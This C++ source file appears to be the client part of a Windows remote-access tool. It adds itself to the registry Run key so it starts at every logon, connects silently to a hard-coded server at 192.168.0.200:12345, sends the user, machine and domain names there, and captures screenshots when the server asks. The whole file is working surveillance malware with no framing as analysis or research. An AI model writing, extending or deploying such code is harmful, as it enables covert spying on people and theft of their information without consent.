#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "ws2_32.lib")
#include <Winsock2.h>
#include <Windows.h>
#include <Ws2tcpip.h>
#include <map>
#include <chrono>
#include <thread>
#include <ctime>
#include "screenshot.hpp"
#include <string>
#include <locale>
#include <codecvt>

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "12345"
#define DEFAULT_HOST "192.168.0.200"

std::string ConvertTCHARToString(const TCHAR* tcharString) {
    int size = WideCharToMultiByte(CP_UTF8, 0, tcharString, -1, nullptr, 0, nullptr, nullptr);
    if (size == 0)
        return "Unknown";

    std::string utf8String(size, 0);
    if (WideCharToMultiByte(CP_UTF8, 0, tcharString, -1, &utf8String[0], size, nullptr, nullptr) == 0)
        return "Unknown";
    return utf8String;
}

void sendComputerInfo(SOCKET clientSocket) {
    TCHAR username[MAX_PATH];
    char machine[MAX_COMPUTERNAME_LENGTH + 1];
    char domain[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_PATH;

    if (GetComputerNameA(machine, &size) &&
        GetUserName(username, &size) &&
        GetComputerNameExA(ComputerNameDnsDomain, domain, &size))
    {
        std::string computerInfo = ConvertTCHARToString(username) + " " + std::string(machine) + " " + std::string(domain);
        if (std::string(domain).empty()) { computerInfo += "WithoutDomain"; }
        send(clientSocket, computerInfo.c_str(), computerInfo.length(), 0);
    }

    return;
}

void HandleClientData(SOCKET clientSocket) {
    sendComputerInfo(clientSocket);
    static ScreenShot_ ScreenShot;
    while (true) {
        char key[1024];
        int bytesRead = recv(clientSocket, key, sizeof(key), 0);
        if (bytesRead == SOCKET_ERROR) { continue; }
        else {
            key[bytesRead] = '\0';
            if (strcmp(key, "screenshot") == 0) {
                ScreenShot.CaptureScreenshot(clientSocket);
            }
        }
    }

    return;
}

void AddToReg() {
    TCHAR exePath[MAX_PATH]; DWORD pathLength = GetModuleFileName(NULL, exePath, MAX_PATH);
    if (pathLength == 0) { return; }

    HKEY hKey;
    LPCTSTR lpValueName = TEXT("MA");
    LPCTSTR lpSubKey = TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    LPCTSTR lpData = exePath;

    RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_SET_VALUE, &hKey);
    RegSetValueEx(hKey, lpValueName, 0, REG_SZ, (LPBYTE)lpData, sizeof(TCHAR) * (lstrlen(lpData) + 1));
    RegCloseKey(hKey);

    return;
}

int WINAPI WinMain(
    _In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPSTR lpCmdLine,
    _In_ int nShowCmd) 
{
    AddToReg();
    SetConsoleOutputCP(CP_UTF8);

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) { return 1; }

    SOCKET ClSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (ClSocket == INVALID_SOCKET) { WSACleanup(); return 1; }

    sockaddr_in ServerAddr;
    ServerAddr.sin_family = AF_INET;
    ServerAddr.sin_port = htons(atoi(DEFAULT_PORT));
    ServerAddr.sin_addr.s_addr = inet_addr(DEFAULT_HOST);

    if (connect(ClSocket, (struct sockaddr*)&ServerAddr, sizeof(ServerAddr)) == SOCKET_ERROR) { closesocket(ClSocket); WSACleanup(); return 1; }

    std::thread HCD(HandleClientData, ClSocket);

    HCD.join();

    closesocket(ClSocket);
    WSACleanup();

    return 0;
}